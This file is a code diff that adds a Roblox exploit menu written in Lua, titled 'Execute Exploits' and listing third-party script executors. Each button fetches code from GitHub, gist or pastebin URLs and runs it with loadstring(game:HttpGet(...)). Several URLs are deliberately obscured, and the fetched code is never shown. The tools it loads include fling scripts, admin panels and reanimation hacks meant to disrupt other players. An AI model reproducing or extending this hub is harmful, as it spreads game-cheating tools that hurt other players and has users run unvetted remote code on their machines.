@@ -1,0 +1,585 @@
+-- Instances:
+
+local More = Instance.new("ScreenGui")
+local More_2 = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local TextButton = Instance.new("TextButton")
+local TextButton_2 = Instance.new("TextButton")
+local TextButton_3 = Instance.new("TextButton")
+local TextButton_4 = Instance.new("TextButton")
+local TextButton_5 = Instance.new("TextButton")
+local TextButton_6 = Instance.new("TextButton")
+local TextButton_7 = Instance.new("TextButton")
+local TextButton_8 = Instance.new("TextButton")
+local TextButton_9 = Instance.new("TextButton")
+local TextButton_10 = Instance.new("TextButton")
+local TextButton_11 = Instance.new("TextButton")
+local TextButton_12 = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local TextLabel_3 = Instance.new("TextLabel")
+local TextLabel_4 = Instance.new("TextLabel")
+local TextLabel_5 = Instance.new("TextLabel")
+local TextButton_13 = Instance.new("TextButton")
+
+--Properties:
+
+More.Name = "More"
+More.Parent = game.CoreGui
+More.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+More_2.Name = "More"
+More_2.Parent = More
+More_2.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+More_2.BorderSizePixel = 0
+More_2.Position = UDim2.new(0.0232743882, 0, 0.147208139, 0)
+More_2.Size = UDim2.new(0, 234, 0, 526)
+
+Frame.Parent = More_2
+Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.0531957895, 0, 0.0248865485, 0)
+Frame.Size = UDim2.new(0, 209, 0, 499)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 209, 0, 22)
+TextLabel.Font = Enum.Font.SourceSansItalic
+TextLabel.Text = "Execute Exploits: FE, R6, R15"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton.BackgroundTransparency = 0.700
+TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0.0334928222, 0, 0.0576152205, 0)
+TextButton.Size = UDim2.new(0, 195, 0, 18)
+TextButton.Font = Enum.Font.SourceSansItalic
+TextButton.Text = "Cursed Spider [R6]"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 14.000
+TextButton.TextStrokeTransparency = 0.000
+
+TextButton_2.Parent = Frame
+TextButton_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_2.BackgroundTransparency = 0.700
+TextButton_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.Position = UDim2.new(0.0334928222, 0, 0.163015664, 0)
+TextButton_2.Size = UDim2.new(0, 195, 0, 18)
+TextButton_2.Font = Enum.Font.SourceSansItalic
+TextButton_2.Text = "Panle [R6, R15]"
+TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_2.TextSize = 14.000
+TextButton_2.TextStrokeTransparency = 0.000
+
+TextButton_3.Parent = Frame
+TextButton_3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_3.BackgroundTransparency = 0.700
+TextButton_3.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.Position = UDim2.new(0.0334928222, 0, 0.219127893, 0)
+TextButton_3.Size = UDim2.new(0, 195, 0, 18)
+TextButton_3.Font = Enum.Font.SourceSansItalic
+TextButton_3.Text = "Vibe Hub [R6]"
+TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_3.TextSize = 14.000
+TextButton_3.TextStrokeTransparency = 0.000
+
+TextButton_4.Parent = Frame
+TextButton_4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_4.BackgroundTransparency = 0.700
+TextButton_4.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.Position = UDim2.new(0.0334928222, 0, 0.277244121, 0)
+TextButton_4.Size = UDim2.new(0, 195, 0, 18)
+TextButton_4.Font = Enum.Font.SourceSansItalic
+TextButton_4.Text = "Big Head V3 [R15]"
+TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_4.TextSize = 14.000
+TextButton_4.TextStrokeTransparency = 0.000
+
+TextButton_5.Parent = Frame
+TextButton_5.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_5.BackgroundTransparency = 0.700
+TextButton_5.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.Position = UDim2.new(0.0334928222, 0, 0.331352353, 0)
+TextButton_5.Size = UDim2.new(0, 195, 0, 18)
+TextButton_5.Font = Enum.Font.SourceSansItalic
+TextButton_5.Text = "Invisible Fling Script [R6]"
+TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_5.TextSize = 14.000
+TextButton_5.TextStrokeTransparency = 0.000
+
+TextButton_6.Parent = Frame
+TextButton_6.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_6.BackgroundTransparency = 0.700
+TextButton_6.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.Position = UDim2.new(0.0334928222, 0, 0.387464583, 0)
+TextButton_6.Size = UDim2.new(0, 195, 0, 18)
+TextButton_6.Font = Enum.Font.SourceSansItalic
+TextButton_6.Text = "HomebrewAdmin"
+TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_6.TextSize = 14.000
+TextButton_6.TextStrokeTransparency = 0.000
+
+TextButton_7.Parent = Frame
+TextButton_7.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_7.BackgroundTransparency = 0.700
+TextButton_7.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.Position = UDim2.new(0.0334928222, 0, 0.439568788, 0)
+TextButton_7.Size = UDim2.new(0, 195, 0, 18)
+TextButton_7.Font = Enum.Font.SourceSansItalic
+TextButton_7.Text = "ShatterVast Admin"
+TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_7.TextSize = 14.000
+TextButton_7.TextStrokeTransparency = 0.000
+
+TextButton_8.Parent = Frame
+TextButton_8.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_8.BackgroundTransparency = 0.700
+TextButton_8.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.Position = UDim2.new(0.0334928222, 0, 0.487664968, 0)
+TextButton_8.Size = UDim2.new(0, 195, 0, 18)
+TextButton_8.Font = Enum.Font.SourceSansItalic
+TextButton_8.Text = "Mouse Fling [R6]"
+TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_8.TextSize = 14.000
+TextButton_8.TextStrokeTransparency = 0.000
+
+TextButton_9.Parent = Frame
+TextButton_9.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_9.BackgroundTransparency = 0.700
+TextButton_9.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.Position = UDim2.new(0.0334928222, 0, 0.53375715, 0)
+TextButton_9.Size = UDim2.new(0, 195, 0, 18)
+TextButton_9.Font = Enum.Font.SourceSansItalic
+TextButton_9.Text = "Dance GUI"
+TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_9.TextSize = 14.000
+TextButton_9.TextStrokeTransparency = 0.000
+
+TextButton_10.Parent = Frame
+TextButton_10.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_10.BackgroundTransparency = 0.700
+TextButton_10.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_10.Position = UDim2.new(0.0334928222, 0, 0.587865353, 0)
+TextButton_10.Size = UDim2.new(0, 195, 0, 18)
+TextButton_10.Font = Enum.Font.SourceSansItalic
+TextButton_10.Text = "Star Dance"
+TextButton_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_10.TextSize = 14.000
+TextButton_10.TextStrokeTransparency = 0.000
+
+TextButton_11.Parent = Frame
+TextButton_11.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_11.BackgroundTransparency = 0.700
+TextButton_11.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_11.Position = UDim2.new(0.0334928222, 0, 0.643977582, 0)
+TextButton_11.Size = UDim2.new(0, 195, 0, 18)
+TextButton_11.Font = Enum.Font.SourceSansItalic
+TextButton_11.Text = "Joy"
+TextButton_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_11.TextSize = 14.000
+TextButton_11.TextStrokeTransparency = 0.000
+
+TextButton_12.Parent = Frame
+TextButton_12.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_12.BackgroundTransparency = 0.700
+TextButton_12.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_12.Position = UDim2.new(0.0334928222, 0, 0.69407779, 0)
+TextButton_12.Size = UDim2.new(0, 195, 0, 18)
+TextButton_12.Font = Enum.Font.SourceSansItalic
+TextButton_12.Text = "Krystal"
+TextButton_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_12.TextSize = 14.000
+TextButton_12.TextStrokeTransparency = 0.000
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0, 0, 0.743487, 0)
+TextLabel_2.Size = UDim2.new(0, 209, 0, 23)
+TextLabel_2.Font = Enum.Font.SourceSansItalic
+TextLabel_2.Text = "Supported Executors"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 14.000
+
+TextLabel_3.Parent = Frame
+TextLabel_3.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextLabel_3.BorderSizePixel = 0
+TextLabel_3.Position = UDim2.new(0.0430622026, 0, 0.811623275, 0)
+TextLabel_3.Size = UDim2.new(0, 191, 0, 23)
+TextLabel_3.Font = Enum.Font.SourceSansItalic
+TextLabel_3.Text = "Synapse, Scriptware, krnl, Spectrum"
+TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_3.TextSize = 14.000
+
+TextLabel_4.Parent = Frame
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextLabel_4.BorderSizePixel = 0
+TextLabel_4.Position = UDim2.new(0.0430622026, 0, 0.8717435, 0)
+TextLabel_4.Size = UDim2.new(0, 191, 0, 23)
+TextLabel_4.Font = Enum.Font.SourceSansItalic
+TextLabel_4.Text = "Kiwi, Ameno, Magma, JJSploit"
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 14.000
+
+TextLabel_5.Parent = Frame
+TextLabel_5.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextLabel_5.BorderSizePixel = 0
+TextLabel_5.Position = UDim2.new(0.0430622026, 0, 0.929859757, 0)
+TextLabel_5.Size = UDim2.new(0, 191, 0, 23)
+TextLabel_5.Font = Enum.Font.SourceSansItalic
+TextLabel_5.Text = "Sentinel, Sk8r, ProtoSmasher"
+TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_5.TextSize = 14.000
+
+TextButton_13.Parent = Frame
+TextButton_13.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TextButton_13.BackgroundTransparency = 0.700
+TextButton_13.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_13.Position = UDim2.new(0.0334928222, 0, 0.110013127, 0)
+TextButton_13.Size = UDim2.new(0, 195, 0, 18)
+TextButton_13.Font = Enum.Font.SourceSansItalic
+TextButton_13.Text = "Finger [R15, Requires Why not me Item]"
+TextButton_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton_13.TextSize = 14.000
+TextButton_13.TextStrokeTransparency = 0.000
+
+-- Scripts:
+
+local function MPAXFXR_fake_script() -- TextButton.LocalScript 
+	local script = Instance.new('LocalScript', TextButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		--Koblins Obamium Spider
+		-- Made by using some animation tools
+	
+		HumanDied = false
+		local reanim
+		local te
+		local ct
+		local m
+		function noplsmesh(hat)
+			_G.OldCF=workspace.Camera.CFrame
+			oldchar=game.Players.LocalPlayer.Character
+			game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
+			for i,v in next, workspace[game.Players.LocalPlayer.Name][hat]:GetDescendants() do
+				if v:IsA('Mesh') or v:IsA('SpecialMesh') then
+					v:Remove()
+				end
+			end
+			game.Players.LocalPlayer.Character=oldchar
+			wait()
+			workspace.Camera.CFrame=_G.OldCF
+			game.Players.LocalPlayer.Character=oldchar
+		end
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/XeneonPlays/Nexo/main/NexoReanimate'),true))()
+	
+		IT = Instance.new
+		CF = CFrame.new
+		VT = Vector3.new
+		RAD = math.rad
+		C3 = Color3.new
+		UD2 = UDim2.new
+		BRICKC = BrickColor.new
+		ANGLES = CFrame.Angles
+		EULER = CFrame.fromEulerAnglesXYZ
+		COS = math.cos
+		ACOS = math.acos
+		SIN = math.sin
+		ASIN = math.asin
+		ABS = math.abs
+		MRANDOM = math.random
+		FLOOR = math.floor
+	
+		speed = 1
+		sine = 1
+		srv = game:GetService('RunService')
+	
+		function hatset(yes,part,c1,c0,nm)
+			reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
+			reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
+			reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
+			if nm==true then
+				noplsmesh(yes)
+			end
+		end
+	
+		--put the hat script converted below
+	
+		reanim = game.Players.LocalPlayer.Character
+		RJ = reanim.HumanoidRootPart.RootJoint
+		RS = reanim.Torso['Right Shoulder']
+		LS = reanim.Torso['Left Shoulder']
+		RH = reanim.Torso['Right Hip']
+		LH = reanim.Torso['Left Hip']
+		Root = reanim.HumanoidRootPart
+		NECK = reanim.Torso.Neck
+		NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+		LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
+	
+		Mode='1'
+	
+		mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
+			if k == 'urkeybind' then-- first mode
+				Mode='1'
+			elseif k == 'urkeybind' then-- second mode
+				Mode='2'
+			elseif k == 'urkeybind' then-- third mode
+				Mode='3'
+			end
+		end)
+	
+		coroutine.wrap(function()
+			while true do -- anim changer
+				if HumanDied then mousechanger:Disconnect() break end
+				sine = sine + speed
+				local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
+				local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
+				local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
+				local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
+				local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
+				local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
+				if lookvector > reanim.Humanoid.WalkSpeed then
+					lookvector = reanim.Humanoid.WalkSpeed
+				end
+				if lookvector < -reanim.Humanoid.WalkSpeed then
+					lookvector = -reanim.Humanoid.WalkSpeed
+				end
+				if rightvector > reanim.Humanoid.WalkSpeed then
+					rightvector = reanim.Humanoid.WalkSpeed
+				end
+				if rightvector < -reanim.Humanoid.WalkSpeed then
+					rightvector = -reanim.Humanoid.WalkSpeed
+				end
+				local lookvel = lookvector / reanim.Humanoid.WalkSpeed
+				local rightvel = rightvector / reanim.Humanoid.WalkSpeed
+				if Mode == '1' then
+					if Root.Velocity.y > 1 then -- jump
+						--jump clerp here
+					elseif Root.Velocity.y < -1 then -- fall
+						--fall clerp here
+					elseif Root.Velocity.Magnitude < 2 then -- idle
+						--idle clerp here
+					elseif Root.Velocity.Magnitude < 20 then -- walk
+						NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
+						RJ.C0 = RJ.C0:Lerp(CF(0+1*math.cos(sine/13),0+1*math.cos(sine/13),0+1*math.cos(sine/13))*ANGLES(RAD(1+0*math.cos(sine/13)),RAD(1+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
+						RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-2+27*math.cos(sine/13)),RAD(-2+7*math.cos(sine/13)),RAD(30+0*math.cos(sine/13))),.3)
+						LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(-24+5*math.cos(sine/13))),.3)
+						RH.C0 = RH.C0:Lerp(CF(2+0*math.cos(sine/8),-1+0*math.cos(sine/8),0+0*math.cos(sine/8))*ANGLES(RAD(0+41*math.cos(sine/8)),RAD(0+32*math.cos(sine/8)),RAD(0+32*math.cos(sine/8))),.3)
+						LH.C0 = LH.C0:Lerp(CF(-2+0*math.cos(sine/8),-1+0*math.cos(sine/8),0+0*math.cos(sine/8))*ANGLES(RAD(0+43*math.cos(sine/8)),RAD(0+36*math.cos(sine/8)),RAD(0+-11*math.cos(sine/8))),.3)
+					elseif Root.Velocity.Magnitude > 20 then -- run
+						--run clerp here
+					end
+				elseif Mode == '2' then
+					if Root.Velocity.y > 1 then -- jump
+						--jump clerp here
+					elseif Root.Velocity.y < -1 then -- fall
+						--fall clerp here
+					elseif Root.Velocity.Magnitude < 2 then -- idle
+						--idle clerp here
+					elseif Root.Velocity.Magnitude < 20 then -- walk
+						--walk clerp here
+					elseif Root.Velocity.Magnitude > 20 then -- run
+						--run clerp here
+					end
+				elseif Mode == '3' then
+					if Root.Velocity.y > 1 then -- jump
+						--jump clerp here
+					elseif Root.Velocity.y < -1 then -- fall
+						--fall clerp here
+					elseif Root.Velocity.Magnitude < 2 then -- idle
+						--idle clerp here
+					elseif Root.Velocity.Magnitude < 20 then -- walk
+						--walk clerp here
+					elseif Root.Velocity.Magnitude > 20 then -- run
+						--run clerp here
+					end
+				end
+				srv.RenderStepped:Wait()
+			end
+		end)()
+	
+		local Sound = Instance.new("Sound")
+		Sound.Parent = game.Workspace
+		Sound.SoundId = "rbxassetid://00"
+		Sound.Looped = true
+		Sound:Play()
+	end)
+end
+coroutine.wrap(MPAXFXR_fake_script)()
+local function RWKXI_fake_script() -- TextButton_2.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/23197469132746871234863721a75861784523687675823a4785617289346987136286587126485699138468756231864837/main/sourcesssssss", true))()
+	end)
+end
+coroutine.wrap(RWKXI_fake_script)()
+local function LRJJEY_fake_script() -- TextButton_3.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_3)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/42757983298472580730847598723480759237407598342709857493825/main/Fingerrr/er/er/r/er/ew/r/ew/r/ewr/r/eww/r/we/r/wer/ewr/ewr/ewr/ewr/ewreewqwe/qwe/38243251*/546/56/34/56/*/5463/*45/6*34/56*3/45*634", true))()
+	end)
+end
+coroutine.wrap(LRJJEY_fake_script)()
+local function VDJBWU_fake_script() -- TextButton_4.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_4)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/sysGhost-aka-BiKode/Scripts2022/main/BigHeadV3_Unpatched", true))()
+	end)
+end
+coroutine.wrap(VDJBWU_fake_script)()
+local function JLFCNMB_fake_script() -- TextButton_5.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_5)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/w32/main/ewrrr", true))()
+	end)
+end
+coroutine.wrap(JLFCNMB_fake_script)()
+local function KJOPFGW_fake_script() -- TextButton_6.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_6)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		_G.CustomUI = false
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/mgamingpro/HomebrewAdmin/master/Main'),true))()
+	end)
+end
+coroutine.wrap(KJOPFGW_fake_script)()
+local function MSHWPQ_fake_script() -- TextButton_7.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_7)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/452-3245324-52345-234/main/635/52/6/23/5/324/5/43/52/34/5/32/a/543/45/234/5/3425/342/5/2345/234/5/234/523/45/342/543/25/2345/234/5/4/4/4/4/6/7/q3/42/4/errw/45/43/245/rew/tew/4t/s/g/f/g/4/4/4/45/6/fd/g/d/234/234324324/32/432/42343/4/gfd/s/rg/ds/rg/f/ds/rg/fd232/rgsd/f/rg/r/gr/j/y/u/t/r/f/g/t/e/sdf/s/e/d/s/ef/d/s/ef/dsef/f", true))()
+	end)
+end
+coroutine.wrap(MSHWPQ_fake_script)()
+local function MFNNRY_fake_script() -- TextButton_8.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_8)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/233333333333333333333333333333333333333/main/347285784236875689723648765872346895324", true))()
+	end)
+end
+coroutine.wrap(MFNNRY_fake_script)()
+local function ZJYMLIO_fake_script() -- TextButton_9.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_9)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
+	end)
+end
+coroutine.wrap(ZJYMLIO_fake_script)()
+local function TGFVPAV_fake_script() -- TextButton_10.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_10)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
+	end)
+end
+coroutine.wrap(TGFVPAV_fake_script)()
+local function RMNU_fake_script() -- TextButton_11.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_11)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
+	end)
+end
+coroutine.wrap(RMNU_fake_script)()
+local function RBHD_fake_script() -- TextButton_12.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_12)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/asd/main/ehjfhlkhsskahlehflkjshdkajhkehfkhdskajehjkfahskdjhjlkeshlfkjzajlksdkjfkehjhl32847t819236r7dssahgfasefsda", true))()
+	end)
+end
+coroutine.wrap(RBHD_fake_script)()
+local function JQBUDR_fake_script() -- TextButton_13.LocalScript 
+	local script = Instance.new('LocalScript', TextButton_13)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/LifeTimeHD7/qweqwe/main/4357435435/345345/345/35344", true))()
+	end)
+end
+coroutine.wrap(JQBUDR_fake_script)()
+local function YHXED_fake_script() -- More_2.DraggingScript 
+	local script = Instance.new('LocalScript', More_2)
+
+	local UIS = game:GetService('UserInputService')
+	local frame = script.Parent
+	local dragToggle = nil
+	local dragSpeed = 0.25
+	local dragStart = nil
+	local startPos = nil
+	
+	local function updateInput(input)
+		local delta = input.Position - dragStart
+		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+	end
+	
+	frame.InputBegan:Connect(function(input)
+		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+			dragToggle = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragToggle = false
+				end
+			end)
+		end
+	end)
+	
+	UIS.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			if dragToggle then
+				updateInput(input)
+			end
+		end
+	end)
+end
+coroutine.wrap(YHXED_fake_script)()
+local function GWVEVZ_fake_script() -- More.LocalScript 
+	local script = Instance.new('LocalScript', More)
+
+	local UIS = game:GetService("UserInputService")
+	
+	UIS.InputBegan:Connect(function(KeyCode)
+		if KeyCode.KeyCode == Enum.KeyCode.X then
+			if KeyCode then
+				script.Parent.More.Visible = false
+			end
+		end
+	end)
+end
+coroutine.wrap(GWVEVZ_fake_script)()
+local function PUICUFV_fake_script() -- More.LocalScript 
+	local script = Instance.new('LocalScript', More)
+
+	local UIS = game:GetService("UserInputService")
+	
+	UIS.InputBegan:Connect(function(KeyCode)
+		if KeyCode.KeyCode == Enum.KeyCode.Z then
+			if KeyCode then
+				script.Parent.More.Visible = true
+			end
+		end
+	end)
+end
+coroutine.wrap(PUICUFV_fake_script)()
